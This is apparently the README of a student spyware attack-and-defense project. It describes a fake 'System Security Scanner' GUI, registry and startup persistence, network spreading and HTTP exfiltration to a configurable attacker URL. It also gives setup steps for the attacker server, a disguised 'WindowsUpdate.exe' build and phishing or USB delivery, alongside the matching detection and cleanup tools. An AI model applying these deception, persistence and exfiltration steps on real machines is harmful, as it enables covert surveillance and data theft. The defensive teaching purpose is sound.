# SPYWARE ATTACK & DEFENSE DEMONSTRATION
**Educational Cybersecurity Project**

⚠️ **WARNING: FOR EDUCATIONAL USE ONLY IN VIRTUAL MACHINE ENVIRONMENT**

---

## PROJECT OVERVIEW

This project demonstrates comprehensive spyware attack techniques and their corresponding defense mechanisms. The attack side implements **10 functions** across 3 purposes (delivery, auto-run, spreading), while the defense side implements **9 functions** to counter each attack vector.

### 📊 Attack Scenario: Professional Spyware
- **Delivery**: Victim receives fake "System Security Scanner" with professional GUI (functions 2-3)
- **Auto-Run (Data Collection)**: Spyware collects system info, encrypts files, establishes persistence (functions 4-6, 10)
- **Spreading**: Network scanning, data exfiltration to attacker server, network propagation (functions 7-9)

### 🛡️ Defense Scenario: Anti-Spyware Scanner
- **Anti-Delivery**: Detects spyware processes and malicious files
- **Anti-Auto-Run**: Removes persistence mechanisms (startup + registry)
- **Anti-Spreading**: Blocks data exfiltration and network spreading

---

## 🏗️ PROJECT STRUCTURE

```
Project/
│
├── malicious_code/                    # SPYWARE ATTACK SIDE
│   ├── spyware_main.py                # Main spyware executable (professional GUI)
│   │
│   ├── delivery/                      # PURPOSE 1: DELIVERY
│   │   ├── fake_update_notification.py          # Fake update GUI
│   │   └── delivery_technique1/
│   │       ├── function2_install_spyware.py     # Function 2: Install to hidden folder
│   │       ├── function3_hide_spyware.py        # Function 3: Hide executable
│   │       ├── auto_send_phishing_direct_download.py  # Phishing delivery
│   │       ├── setup_delivery.py                # Delivery setup script
│   │       └── WindowsUpdate.exe                # Built executable
│   │
│   ├── auto_run/                      # PURPOSE 2: AUTO-RUN (DATA COLLECTION)
│   │   ├── technique1/
│   │   │   ├── function4_collect_data.py        # Function 4: Collect victim data
│   │   │   └── function10_encrypt_files.py      # Function 10: Encrypt collected files
│   │   └── technique2/
│   │       ├── function5_persistence_startup.py # Function 5: Startup folder
│   │       └── function6_persistence_registry.py# Function 6: Registry key
│   │
│   └── spreading/                     # PURPOSE 3: SPREADING
│       ├── technique1/
│       │   └── function7_scan_network.py        # Function 7: Network scanning
│       └── technique2/
│           ├── function8_spread_spyware.py      # Function 8: Network replication
│           └── function9_exfiltrate_report.py   # Function 9: Data exfiltration
│
├── anti_malicious_code/               # DEFENSE SIDE
│   ├── defender_scanner.py            # Main defender GUI (comprehensive scanner)
│   │
│   ├── anti_delivery/                 # PURPOSE 1: ANTI-DELIVERY
│   │   ├── function1_detect_spyware.py          # Function 1: Process detection
│   │   ├── function2_scan_spyware_files.py      # Function 2: File scanning
│   │   ├── function3_quarantine_spyware.py      # Function 3: Quarantine threats
│   │   └── decryption_tool.py                   # Decryption utility
│   │
│   ├── anti_auto_run/                 # PURPOSE 2: ANTI-AUTO-RUN
│   │   ├── function4_detect_persistence.py      # Function 4: Startup detection
│   │   ├── function5_scan_registry_spyware.py   # Function 5: Registry scanning
│   │   └── function6_remove_spyware_persistence.py # Function 6: Remove persistence
│   │
│   └── anti_spreading/                # PURPOSE 3: ANTI-SPREADING
│       ├── function7_monitor_exfiltration.py    # Function 7: Monitor exfiltration
│       ├── function8_block_spreading.py         # Function 8: Block spreading
│       └── function9_generate_report.py         # Function 9: Security report
│
├── server/                            # ATTACKER SERVER
│   ├── attacker_server.py             # Flask server to receive exfiltrated data
│   └── config.py                      # Server configuration (IP/port settings)
│
└── received_victim_data/              # RECEIVED DATA FROM VICTIMS
    ├── victim_*.json                  # Victim data files
    └── DESKTOP-*_files/               # Exfiltrated files from victims
```

---

## 🚀 USAGE INSTRUCTIONS

### **PREREQUISITE: VMware Environment**
- ✅ Run ONLY in VMware virtual machine
- ✅ Windows OS with Python 3.x installed
- ✅ Install required libraries: `pip install psutil flask requests`

### **Real Data Exfiltration & Delivery Setup**

**Enable REAL data exfiltration to attacker server:**

1. **Start attacker server** on attacker machine:
   ```powershell
   cd server
   python attacker_server.py
   ```
   Note the IP address displayed (e.g., 192.XXX.X.XXX)

2. **Configure attacker URL** in `server/config.py`:
   ```python
   ATTACKER_URL = "http://XXX.XXX.X.XXX:5555/receive"  # Use your IP
   USE_REAL_EXFILTRATION = True
   ```

3. **Build executable** (optional, for delivery):
   ```powershell
   cd malicious_code
   pyinstaller WindowsUpdate.spec
   ```
   Creates `WindowsUpdate.exe` in `dist/` folder

4. **Delivery options:**
   - Direct execution: Run `spyware_main.py`
   - Phishing: Use `delivery/delivery_technique1/setup_delivery.py`
   - USB/Email: Deploy `WindowsUpdate.exe` to victim

5. **Receive data:** Victim data appears in `received_victim_data/` folder on attacker machine

---

### **Running the Spyware Attack (Basic)**

1. Navigate to malicious_code directory:
   ```powershell
   cd "c:\Users\TUF\Documents\Cyber\cybersecurity_final_project-master\malicious_code"
   ```

2. Run the spyware main application:
   ```powershell
   python spyware_main.py
   ```

3. **What happens:**
   - Professional "System Security Scanner" GUI appears
   - Victim clicks "Start Security Scan"
   - Behind the scenes: All 9 spyware functions execute
   - Installs to: `%APPDATA%\SystemSecurityService`
   - Creates persistence: Startup shortcut + Registry key
   - Collects data: System info, files, apps → JSON
   - **NEW:** Sends data to attacker server (if configured)
   - Simulates: Network scanning and data exfiltration

### **Running the Defense Scanner**

1. Navigate to anti_malicious_code directory:
   ```powershell
   cd "c:\Users\TUF\Documents\Year3\Term 1\Cybersecurity\Project\anti_malicious_code"
   ```

2. Run the defender scanner:
   ```powershell
   python defender_scanner.py
   ```

3. **What happens:**
   - Professional "Anti-Spyware Defender Scanner" GUI appears
   - Click "START SCAN" to detect threats
   - Scanner executes all 9 detection functions
   - Displays detected threats in real-time console
   - Click "QUARANTINE THREATS" to terminate processes and move files
   - Click "REMOVE PERSISTENCE" to clean startup and registry
   - Report saved to: `%TEMP%\AntiSpyware_Reports`

---

## 📋 FUNCTION DETAILS

### **SPYWARE FUNCTIONS (Attack Side)**

| # | Function | Purpose | Description |
|---|----------|---------|-------------|
| 1 | GUI in `spyware_main.py` | Delivery | Shows professional fake security scanner GUI |
| 2 | `function2_install_spyware.py` | Delivery | Creates `SystemSecurityService` hidden folder |
| 3 | `function3_hide_spyware.py` | Delivery | Copies to hidden location as `SecurityScanner.exe` |
| 4 | `function4_collect_data.py` | Auto-Run | Collects system info, file lists, installed apps |
| 5 | `function5_persistence_startup.py` | Auto-Run | Adds hidden shortcut to Startup folder |
| 6 | `function6_persistence_registry.py` | Auto-Run | Adds registry Run key: `SystemSecurityScanner` |
| 7 | `function7_scan_network.py` | Spreading | Scans network for accessible shares |
| 8 | `function8_spread_spyware.py` | Spreading | Replicates to network with social engineering names |
| 9 | `function9_exfiltrate_report.py` | Spreading | Exfiltrates data to attacker server via HTTP POST |
| 10 | `function10_encrypt_files.py` | Auto-Run | Encrypts collected data for secure exfiltration |

### **DEFENDER FUNCTIONS (Defense Side)**

| # | Function | Purpose | Description |
|---|----------|---------|-------------|
| 1 | `function1_detect_spyware.py` | Anti-Delivery | Detects suspicious processes (SecurityScanner, etc.) |
| 2 | `function2_scan_spyware_files.py` | Anti-Delivery | Scans AppData for `SystemSecurityService` folder |
| 3 | `function3_quarantine_spyware.py` | Anti-Delivery | Terminates processes, moves to `SpywareQuarantine` |
| 4 | `function4_detect_persistence.py` | Anti-Auto-Run | Scans Startup folder for spyware shortcuts |
| 5 | `function5_scan_registry_spyware.py` | Anti-Auto-Run | Scans registry Run keys for spyware entries |
| 6 | `function6_remove_spyware_persistence.py` | Anti-Auto-Run | Removes all persistence mechanisms |
| 7 | `function7_monitor_exfiltration.py` | Anti-Spreading | Monitors for data exfiltration indicators |
| 8 | `function8_block_spreading.py` | Anti-Spreading | Blocks spyware network spreading attempts |
| 9 | `function9_generate_report.py` | Anti-Spreading | Generates comprehensive security scan report |

---

## 🎯 KEY FEATURES

### **Spyware Side (spyware_main.py)**
- ✅ Professional GUI mimicking legitimate security software
- ✅ Progress bar with realistic scanning messages
- ✅ Console output showing "Security Check" messages
- ✅ All 9 functions execute during fake scan
- ✅ Thread-based background execution
- ✅ Window size: 1280x720 (optimized for VMware)

### **Defender Side (defender_scanner.py)**
- ✅ Professional anti-spyware scanner interface
- ✅ Real-time threat detection console
- ✅ Progress bar tracking scan phases
- ✅ Color-coded status indicators (green/yellow/red)
- ✅ Action buttons: START SCAN, QUARANTINE THREATS, REMOVE PERSISTENCE
- ✅ Comprehensive JSON and text report generation
- ✅ Window size: 1000x700

---

## 🔍 DEMONSTRATION FLOW

### **Step 1: Show Clean System**
1. Run defender_scanner.py
2. Click "START SCAN"
3. Result: "✓ System Clean - No threats detected"

### **Step 2: Execute Spyware Attack**
1. Run spyware_main.py
2. Click "Start Security Scan"
3. Wait for "Security scan complete!" message
4. Spyware now installed with persistence

### **Step 3: Detect Threats**
1. Run defender_scanner.py again
2. Click "START SCAN"
3. Result: "⚠ WARNING: X threats detected!"
4. Console shows:
   - Suspicious processes detected
   - Spyware files found
   - Persistence mechanisms identified

### **Step 4: Clean System**
1. Click "QUARANTINE THREATS" button
   - Terminates spyware processes
   - Moves files to quarantine folder
2. Click "REMOVE PERSISTENCE" button
   - Removes startup shortcut
   - Deletes registry key
3. Result: "✓ System Clean"

---

## 📊 TECHNICAL SPECIFICATIONS

### **Technologies Used**
- **Language**: Python 3.x
- **GUI Framework**: tkinter (native Windows interface)
- **System Libraries**: psutil, winreg, os, shutil, json
- **Web Framework**: Flask (attacker server)
- **HTTP Client**: requests (data exfiltration)
- **Threading**: Background execution for non-blocking operations

### **System Requirements**
- Windows 10/11 (VMware VM recommended)
- Python 3.7 or higher
- Required libraries: `pip install psutil flask requests cryptography`
- Minimum 2GB RAM
- 100MB free disk space
- Network connectivity (for real exfiltration testing)

### **Data Collected by Spyware**
- System information (hostname, username, OS version)
- File lists (Documents, Pictures, Desktop folders)
- Installed applications list
- Network configuration
- Screenshot capability
- Data encrypted and saved to JSON format
- **Real exfiltration**: HTTP POST to attacker server (configurable in `config.py`)
- Received data stored in `received_victim_data/` on attacker machine

### **Detection Mechanisms**
- Process name matching (keywords: security, scanner, system)
- File path scanning (AppData for hidden folders)
- Registry key enumeration (Run keys)
- Startup folder inspection
- Data exfiltration file detection

---

## 🎓 EDUCATIONAL VALUE

### **Attack Techniques Demonstrated**
1. **Social Engineering**: Fake security software GUI
2. **Stealth Installation**: Hidden folders and files
3. **Persistence**: Multiple mechanisms (startup + registry)
4. **Data Collection**: Comprehensive system profiling
5. **Network Spreading**: Lateral movement simulation
6. **Data Exfiltration**: Information theft demonstration

### **Defense Techniques Demonstrated**
1. **Process Monitoring**: Real-time suspicious process detection
2. **File System Scanning**: Hidden folder discovery
3. **Persistence Removal**: Cleaning auto-run mechanisms
4. **Quarantine Operations**: Safe threat isolation
5. **Network Protection**: Spread blocking
6. **Incident Reporting**: Comprehensive documentation

---

## ⚠️ SAFETY NOTES

### **Why This is Safe for Education**
- ✅ **Controlled Environment**: Real exfiltration only works within local network (VMware)
- ✅ **No External Servers**: Data stays on your attacker server, not sent to internet
- ✅ **VM Environment**: Isolated from host system
- ✅ **Easy Removal**: Defender scanner completely cleans system
- ✅ **Educational Purpose**: Demonstrates real-world concepts in safe lab environment
- ⚠️ **Note**: Real HTTP exfiltration is implemented but requires local server setup

### **Ethical Considerations**
- 🔒 Run ONLY in controlled lab environment
- 🔒 NEVER deploy on production systems
- 🔒 NEVER use for malicious purposes
- 🔒 VMware snapshot before testing
- 🔒 Respect cybersecurity ethics and laws

---

## 📞 PROJECT INFORMATION

**Course**: Year 3 - Term 1 - Cybersecurity  
**Project Type**: Malicious Code Attack & Defense Demonstration   
**Environment**: VMware Windows Virtual Machine  


--- 

